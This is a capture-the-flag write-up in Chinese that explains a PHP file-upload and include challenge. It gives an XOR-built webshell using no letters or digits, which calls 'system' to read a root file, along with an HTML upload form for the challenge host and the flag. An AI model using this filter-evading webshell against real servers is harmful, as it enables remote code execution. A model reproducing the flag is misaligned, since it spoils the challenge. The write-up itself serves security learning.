# Patch Peep Huck (w) 

這題一開始要看懂他的題目，他弄的很難看懂

`!!$l='tmp_name'`會把`$l`設成`'tmp_name'`，並且因為NOT運算，最後整句結果是`1`

也就是`$_FILES[!!$l='tmp_name']`實際上就是存取`$_FILES[1]`

`$I['size']>>7`是判斷size不能超過這個大小，否則這邊會變成True，就沒辦法include檔案了

其實重點在最後一個條件

`preg_match('/\w/',join(file($I[$l])))`

這邊是取出我們上傳的檔案的內容，如果裡面有出現英數字或底線，就不給你include

所以我們就是構造個「不用到英數字和底線」的webshell

方法很多，我這邊是用`XOR`去構造`system`字串和我要執行的command

My Payload:

```php
<?=
$💩 = '[[[[@@' ^ '("(/%-';
$💩(('@@['^'#!/')." /????");
```

我用來上傳的html:

```html
<html>
<body>
<form action="http://phuck.fflm.ml/put.php" method="post" enctype="multipart/form-data">
<input type="file" name="1">
<input type="file" name="2">
<input type="submit" name="submit">
</form>
</body>
</html>
```

FLAG: `vxctf{Symb01icExecut10nCanPhuck}`
